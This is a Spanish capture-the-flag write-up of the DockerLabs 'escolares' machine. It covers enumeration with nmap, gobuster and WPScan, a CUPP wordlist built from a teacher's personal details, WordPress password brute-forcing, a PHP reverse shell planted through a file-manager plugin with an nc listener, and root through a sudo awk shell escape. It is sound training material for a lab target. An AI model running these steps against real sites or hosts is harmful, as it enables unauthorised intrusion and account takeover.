---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `WordPress` `OSINT` `CUPP` `WPScan` `Brute Force` `RCE` `Sudoers`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip escolares.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh escolares.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 23:29 CET
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:24:24:f5:66:68:a4:ad:8e:24:0d:70:4a:a5:e3:4f (ECDSA)
|_  256 29:42:2e:b6:85:ae:fb:09:89:8d:b9:c1:dc:4d:fc:1e (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: P\xC3\xA1gina Escolar Universitaria
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

Identificamos los puertos `22` y `80` abiertos.

Accedemos al servicio web del puerto `80` y encontramos la siguiente página:

![](../../images/escolares.png)

En la pestaña profesores encontramos la información personal del profesorado, lo cual nos da una gran pista:

![](../../images/luisprofe.png)

Nos dice que estamos ante un `WordPress` y que `Luis` es el administrador de este.

## GOBUSTER

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 6738]
/info.php             (Status: 200) [Size: 87157]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/contacto.html        (Status: 200) [Size: 3210]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://172.17.0.2/phpmyadmin/]
Progress: 193790 / 1543906 (12.55%)
```

Efectivamente, confirmamos que existe un `WordPress`, por lo que procedemos a su enumeración con `WPScan`.

## WPSCAN

```bash
wpscan --url http://172.17.0.2/wordpress --api-token "srCmCA5xh0l66CHqXAXXXXXesEEjKKq2ckuzYle5k" --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Dec  9 23:41:38 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress theme in use: twentytwentyfour
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] luisillo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Tue Dec  9 23:41:42 2025
[+] Requests Done: 54
[+] Cached Requests: 5
[+] Data Sent: 13.735 KB
[+] Data Received: 356.025 KB
[+] Memory used: 168.035 MB
[+] Elapsed time: 00:00:03
```

Identificamos el usuario `luisillo`, que como hemos visto antes pertenece a `Luis`.

En este punto intentamos realizar un ataque de `fuerza bruta` contra el `wp-login.php` de WordPress y contra el servicio `SSH`, pero sin éxito.

Optamos por utilizar la herramienta `CUPP`, que sirve para crear diccionarios personalizados basados en información personal de la víctima.

En este caso, utilizamos la información personal que encontramos en la página `profesores.html`.

```bash
cupp -i
```

Info:

```
___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Luis
> Surname:    
> Nickname: luisillo
> Birthdate (DDMMYYYY): 09101981


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: y       
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: 19131337
> Do you want to add special chars at the end of words? Y/[N]: n
> Do you want to add some random numbers at the end of words? Y/[N]:n
> Leet mode? (i.e. leet = 1337) Y/[N]: n

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to luis.txt, counting 1844 words.
[+] Now load your pistolero with luis.txt and shoot! Good luck!
```

Generamos el diccionario con el nombre `luis.txt`.

Intentamos de nuevo un ataque de `fuerza bruta` contra el login de `WordPress`.

```bash
wpscan --url http://172.17.0.2/wordpress --passwords luis.txt --usernames luisillo
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Dec  9 23:52:33 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://172.17.0.2/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/, Match: 'WordPress 6.5.4'

[+] WordPress theme in use: twentytwentyfour
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Performing password attack on Xmlrpc against 1 user/s
Trying luisillo / 19131337010 Time: 00:00:00 <> (56 / 1844)  3.03%  

[!] Valid Combinations Found:
 | Username: luisillo, Password: Luis1981

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Dec  9 23:52:42 2025
[+] Requests Done: 429
[+] Cached Requests: 5
[+] Data Sent: 186.245 KB
[+] Data Received: 449.95 KB
[+] Memory used: 270.168 MB
[+] Elapsed time: 00:00:08
```

Encontramos las credenciales válidas para el usuario `luisillo` : `Luis1981`.

Intentamos acceder con este usuario y contraseña al dashboard de `WordPress`, pero obtenemos el siguiente error:

![](../../images/escolaresdl.png)

Esto indica que debemos añadir el dominio `escolares.dl` al archivo `/etc/hosts`.

```bash
nano /etc/hosts
```

Info:

```
127.0.0.1	    localhost
127.0.1.1	    kali
172.17.0.2      escolares.dl
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Tras configurar el archivo, intentamos acceder otra vez al `wp-admin` y entramos con éxito.

![](../../images/wp_luis.png)

Dentro del panel de administración encontramos un `plugin` llamado `WP File Manager`.

Este plugin nos permite gestionar (añadir, eliminar, editar...) los archivos de la instalación de WordPress.

Nos aprovechamos de este componente para editar el archivo `index.php`, que se encuentra en el directorio `/themes`.

![](../../images/revshellwp.png)

Sustituimos el contenido original por código `PHP` malicioso para obtener una `reverse shell`.

Ponemos un `listener` en nuestra máquina atacante.

```bash
nc -nlvp 4444
```

A continuación, navegamos al archivo `.php` que hemos modificado desde el navegador.

```
http://172.17.0.2/wordpress/wp-content/themes/index.php
```

Info:

```
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33258
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
www-data@51476b64c967:/var/www/html/wordpress/wp-content/themes$
```

Recibimos la shell como el usuario `www-data`.

## TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```

`ctrl Z`

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

## ESCALADA DE PRIVILEGIOS

Leemos el archivo `/etc/passwd` y verificamos que existe en el sistema un usuario llamado `luisillo`.

En el directorio `/home` encontramos un archivo `secret.txt` y leemos su contenido:

```
luisillopasswordsecret
```

Probamos a reutilizar esta contraseña para la autenticación del usuario `luisillo`.

```bash
su luisillo
```

Info:

```
luisillo@51476b64c967:/home$ whoami
luisillo
luisillo@51476b64c967:/home$
```

Una vez logueados como `luisillo`, comprobamos los permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for luisillo on 51476b64c967:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User luisillo may run the following commands on 51476b64c967:
    (ALL) NOPASSWD: /usr/bin/awk
```

Vemos que podemos ejecutar el binario `awk` con privilegios de `root`. Aprovechamos esta configuración para escalar privilegios con el siguiente comando:

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

Info:

```
root@51476b64c967:/home# whoami
root
root@51476b64c967:/home#
```

Ya somos root!
